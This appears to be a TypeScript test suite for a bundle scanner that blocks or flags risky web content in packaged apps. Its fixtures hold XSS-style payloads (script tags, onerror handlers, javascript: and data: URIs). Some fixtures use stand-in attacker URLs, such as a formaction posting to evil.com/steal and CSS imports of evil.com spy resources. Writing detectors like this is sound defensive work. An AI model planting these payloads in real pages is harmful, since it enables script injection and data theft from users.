import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, test } from "bun:test";

import JSZip from "jszip";

import { scanBundle, type ScanFinding } from "../bundler/bundle-scanner.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const MINIMAL_MANIFEST = {
  format_version: "1",
  name: "test-app",
  created_at: "2025-01-01T00:00:00Z",
  created_by: "test",
  entry: "index.html",
  capabilities: [],
};

let tempDir: string;

beforeAll(async () => {
  tempDir = await mkdtemp(join(tmpdir(), "bundle-scanner-test-"));
});

afterAll(async () => {
  await rm(tempDir, { recursive: true, force: true });
});

async function createBundle(
  files: Record<string, string | Uint8Array>,
  manifest?: Record<string, unknown>,
): Promise<string> {
  const zip = new JSZip();
  const m = manifest ?? MINIMAL_MANIFEST;
  zip.file("manifest.json", JSON.stringify(m));

  for (const [name, content] of Object.entries(files)) {
    if (typeof content === "string") {
      zip.file(name, content);
    } else {
      zip.file(name, content);
    }
  }

  const data = await zip.generateAsync({ type: "uint8array" });
  const path = join(
    tempDir,
    `test-${Date.now()}-${Math.random().toString(36).slice(2)}.vellum`,
  );
  await Bun.write(path, data);
  return path;
}

function findByCode(
  findings: ScanFinding[],
  code: string,
): ScanFinding | undefined {
  return findings.find((f) => f.code === code);
}

// ---------------------------------------------------------------------------
// SVG <script> tags (block)
// ---------------------------------------------------------------------------

describe("SVG script tags", () => {
  test("blocks SVG with <script> tag", async () => {
    const path = await createBundle({
      "index.html": "<html><body>Hello</body></html>",
      "assets/icon.svg":
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "svg_script");
    expect(f).toBeDefined();
    expect(f!.level).toBe("block");
  });

  test("passes clean SVG without script", async () => {
    const path = await createBundle({
      "index.html": "<html><body>Hello</body></html>",
      "assets/icon.svg":
        '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="40"/></svg>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "svg_script");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// iframe srcdoc (block)
// ---------------------------------------------------------------------------

describe("iframe srcdoc", () => {
  test("blocks iframe with srcdoc attribute", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><iframe srcdoc="<script>alert(1)</script>"></iframe></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "iframe_srcdoc");
    expect(f).toBeDefined();
    expect(f!.level).toBe("block");
  });

  test("passes HTML without srcdoc", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><iframe src="about:blank"></iframe></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "iframe_srcdoc");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// formaction attribute (block)
// ---------------------------------------------------------------------------

describe("formaction attribute", () => {
  test("blocks formaction with external URL", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><button formaction="https://evil.com/steal">Submit</button></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "formaction_external");
    expect(f).toBeDefined();
    expect(f!.level).toBe("block");
  });

  test("passes form without formaction", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><form action="#"><button>Submit</button></form></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "formaction_external");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// HTML event handler attributes (warn)
// ---------------------------------------------------------------------------

describe("HTML event handlers", () => {
  test("warns on onerror attribute", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><img onerror="alert(1)" src="x"></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "html_event_handler");
    expect(f).toBeDefined();
    expect(f!.level).toBe("warn");
  });

  test("warns on onclick attribute", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><div onclick="doStuff()">Click</div></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "html_event_handler");
    expect(f).toBeDefined();
    expect(f!.level).toBe("warn");
  });

  test("passes HTML without event handlers", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><div class="container">Safe</div></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "html_event_handler");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// CSS @import (warn)
// ---------------------------------------------------------------------------

describe("CSS @import", () => {
  test("warns on @import url()", async () => {
    const path = await createBundle({
      "index.html":
        "<html><head><style>@import url(https://evil.com/spy.css);</style></head><body></body></html>",
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "css_import");
    expect(f).toBeDefined();
    expect(f!.level).toBe("warn");
  });

  test("warns on @import with quoted URL", async () => {
    const path = await createBundle({
      "index.html":
        "<html><head><style>@import 'https://evil.com/spy.css';</style></head><body></body></html>",
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "css_import");
    expect(f).toBeDefined();
  });

  test("passes without CSS @import", async () => {
    const path = await createBundle({
      "index.html":
        "<html><head><style>body { color: red; }</style></head><body></body></html>",
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "css_import");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// CSS url() with external URLs (warn)
// ---------------------------------------------------------------------------

describe("CSS external url()", () => {
  test("warns on url() with https", async () => {
    const path = await createBundle({
      "index.html":
        "<html><head><style>body { background: url('https://evil.com/pixel.gif'); }</style></head><body></body></html>",
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "css_external_url");
    expect(f).toBeDefined();
    expect(f!.level).toBe("warn");
  });

  test("passes url() with local path", async () => {
    const path = await createBundle({
      "index.html":
        "<html><head><style>body { background: url('assets/bg.png'); }</style></head><body></body></html>",
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "css_external_url");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// data: URI in src/href (warn)
// ---------------------------------------------------------------------------

describe("data: URI", () => {
  test("warns on script src with data: URI", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><script src="data:text/javascript,alert(1)"></script></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "data_uri");
    expect(f).toBeDefined();
    expect(f!.level).toBe("warn");
  });

  test("passes normal script src", async () => {
    const path = await createBundle({
      "index.html": '<html><body><script src="app.js"></script></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "data_uri");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// javascript: URI (warn)
// ---------------------------------------------------------------------------

describe("javascript: URI", () => {
  test("warns on href with javascript: URI", async () => {
    const path = await createBundle({
      "index.html":
        '<html><body><a href="javascript:alert(1)">Click</a></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "javascript_uri");
    expect(f).toBeDefined();
    expect(f!.level).toBe("warn");
  });

  test("passes normal href", async () => {
    const path = await createBundle({
      "index.html": '<html><body><a href="#section">Link</a></body></html>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "javascript_uri");
    expect(f).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// SVG event handlers (warn)
// ---------------------------------------------------------------------------

describe("SVG event handlers", () => {
  test("warns on SVG with onload handler", async () => {
    const path = await createBundle({
      "index.html": "<html><body>Hello</body></html>",
      "assets/icon.svg":
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle cx="50" cy="50" r="40"/></svg>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "svg_event_handler");
    expect(f).toBeDefined();
    expect(f!.level).toBe("warn");
  });

  test("warns on SVG element with onclick handler", async () => {
    const path = await createBundle({
      "index.html": "<html><body>Hello</body></html>",
      "assets/icon.svg":
        '<svg xmlns="http://www.w3.org/2000/svg"><circle onclick="alert(1)" cx="50" cy="50" r="40"/></svg>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "svg_event_handler");
    expect(f).toBeDefined();
  });

  test("passes clean SVG without event handlers", async () => {
    const path = await createBundle({
      "index.html": "<html><body>Hello</body></html>",
      "assets/icon.svg":
        '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="40" fill="red"/></svg>',
    });
    const result = await scanBundle(path);
    const f = findByCode(result.findings, "svg_event_handler");
    expect(f).toBeUndefined();
  });
});
